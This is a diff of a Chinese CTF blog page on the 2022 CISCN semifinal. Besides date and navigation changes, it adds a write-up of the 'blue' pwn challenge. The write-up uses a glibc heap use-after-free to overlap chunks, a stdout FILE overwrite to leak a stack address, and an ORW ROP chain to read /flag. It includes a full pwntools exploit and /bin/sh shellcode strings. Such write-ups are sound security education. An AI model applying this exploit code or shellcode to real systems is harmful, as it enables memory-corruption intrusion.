@@ -19,13 +19,13 @@
     <meta name="description" content="对2022国赛复赛的pwn题进行学习，采用一题多解的方式让自己更深入地了解glibc的堆利用">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2022 ciscn 复赛">
-<meta property="og:url" content="http://example.com/2022/07/03/CTF_competition/2022ciscn_again/index.html">
+<meta property="og:url" content="http://example.com/2022/07/21/CTF_competition/2022ciscn_again/index.html">
 <meta property="og:site_name" content="Pursue">
 <meta property="og:description" content="对2022国赛复赛的pwn题进行学习，采用一题多解的方式让自己更深入地了解glibc的堆利用">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/photo/beautiful_fantasy_castle.jpg">
-<meta property="article:published_time" content="2022-07-02T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-07-15T03:43:25.407Z">
+<meta property="article:published_time" content="2022-07-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-07-21T13:22:41.410Z">
 <meta property="article:author" content="Pursue">
 <meta property="article:tag" content="ciscn">
 <meta name="twitter:card" content="summary_large_image">
@@ -223,8 +223,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-07-03 00:00" pubdate>
-          2022年7月3日 凌晨
+        <time datetime="2022-07-21 00:00" pubdate>
+          2022年7月21日 凌晨
         </time>
       </span>
     
@@ -236,7 +236,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          18k 字
+          22k 字
         
       </span>
     
@@ -248,7 +248,7 @@
         
         
           <!-- compatible with older versions-->
-          149 分钟
+          180 分钟
         
       </span>
     
@@ -342,6 +342,15 @@
 
 
 
+<h2 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h2><p>题目只能对一个堆块使用uaf，并且最大的chunk大小为0xa0，所以难点在于怎样制造堆块的重叠进行后续的利用。由于这道题没有edit功能，所以我们想要制造堆块重叠，那可以使得unsortedbin和tcathe中分别存在同一堆块（也可以是有物理上交叉的堆块），这样当我们从unsortedbin中取出堆块，就可以对释放进tcathe中的交叉堆块进行写fd的操作。</p>
+<p>如何制造以上的效果？如果我们不进行任何操作就对一个被释放在unsortedbin中的chunk进行free，即使能将chunk放入tcache，也会导致unsortedbin的链表被破坏导致程序出错，所以我们可以采用堆块合并的方式，使得可以uaf的指针影藏在合并的堆块中，这样再次free时就不会出错，如下图所示：</p>
+<p><img src="/ciscn2022/blue.png" srcset="/img/loading.gif" lazyload alt="uaf"></p>
+<p>这里还要注意的就是，我们只能使用一次show的功能，所以我们要利用IO(stdout)来进行泄露栈地址，最后进行orw。</p>
+<p>WP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>	sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>	sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, data</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;Please input content: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment"># leak libc</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;pursue&#x27;</span>)    <span class="hljs-comment"># 0-6</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;pursue&#x27;</span>)    <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;pursue&#x27;</span>)    <span class="hljs-comment"># 8</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;pursue&#x27;</span>)    <span class="hljs-comment"># 9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br>magic(<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">8</span>)<br>libc_base = uu64() - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;environ&#x27;</span>)<br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;stdout&#x27;</span>)<br>op = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>rd = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>wt = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pt = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>p_rdi_r = libc_base + <span class="hljs-number">0x0000000000023b6a</span><br>p_rsi_r = libc_base + <span class="hljs-number">0x000000000002601f</span><br>p_rdx_r = libc_base + <span class="hljs-number">0x0000000000142c92</span><br><br><span class="hljs-comment"># create overlap</span><br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;pursue&#x27;</span>)    <span class="hljs-comment"># 0</span><br>delete(<span class="hljs-number">8</span>)<br><br>add(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;pursue&#x27;</span>)    <span class="hljs-comment"># 1</span><br>pld = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p64(stdout)<br>add(<span class="hljs-number">0x90</span>, pld)          <span class="hljs-comment"># 2</span><br><br><span class="hljs-comment"># modify stdout</span><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;pursue&#x27;</span>)    <span class="hljs-comment"># 3</span><br>pld = p64(<span class="hljs-number">0xfbad1800</span>)   <span class="hljs-comment"># flags</span><br>pld += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>pld += p64(environ)     <span class="hljs-comment"># _IO_write_base</span><br>pld += p64(environ + <span class="hljs-number">8</span>) <span class="hljs-comment"># _IO_write_ptr</span><br>add(<span class="hljs-number">0x80</span>, pld)          <span class="hljs-comment"># 4</span><br>leak_stack = uu64()<br>lg(<span class="hljs-string">&#x27;leak_stack&#x27;</span>)<br><br><span class="hljs-comment"># modify ret_addr</span><br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">2</span>)<br>ret = leak_stack - <span class="hljs-number">0x128</span><br>lg(<span class="hljs-string">&#x27;ret&#x27;</span>)<br>pld = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p64(ret)<br><span class="hljs-comment"># dbg()</span><br>add(<span class="hljs-number">0x90</span>, pld)<br><br>orw = <span class="hljs-string">b&#x27;/flag\x00\x00\x00&#x27;</span><br>orw += p64(p_rdi_r) + p64(ret) + p64(p_rsi_r) + p64(<span class="hljs-number">0</span>) + p64(op)<br>orw += p64(p_rdi_r) + p64(<span class="hljs-number">3</span>) + p64(p_rsi_r) + p64(ret + <span class="hljs-number">0x100</span>) + p64(p_rdx_r) + p64(<span class="hljs-number">0x30</span>) + p64(rd)<br>orw += p64(p_rdi_r) + p64(ret + <span class="hljs-number">0x100</span>) + p64(pt)<br><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;pursue&#x27;</span>)<br><span class="hljs-comment"># dbg()</span><br>add(<span class="hljs-number">0x80</span>, orw)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
 
 
 
@@ -390,7 +399,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>2022 ciscn 复赛</div>
-      <div>http://example.com/2022/07/03/CTF_competition/2022ciscn_again/</div>
+      <div>http://example.com/2022/07/21/CTF_competition/2022ciscn_again/</div>
     </div>
     <div class="license-meta">
       
@@ -402,7 +411,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年7月3日</div>
+          <div>2022年7月21日</div>
         </div>
       
       
@@ -432,18 +441,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/07/06/Re/IDA_remote_dbg/" title="学习用IDA远程调试ELF文件">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">学习用IDA远程调试ELF文件</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/07/01/CTF_competition/2022ciscn/" title="2022 ciscn 初赛">
-                        <span class="hidden-mobile">2022 ciscn 初赛</span>
+                      <a href="/2022/07/16/Pwn/sandbox/" title="Sandbox总结">
+                        <span class="hidden-mobile">Sandbox总结</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
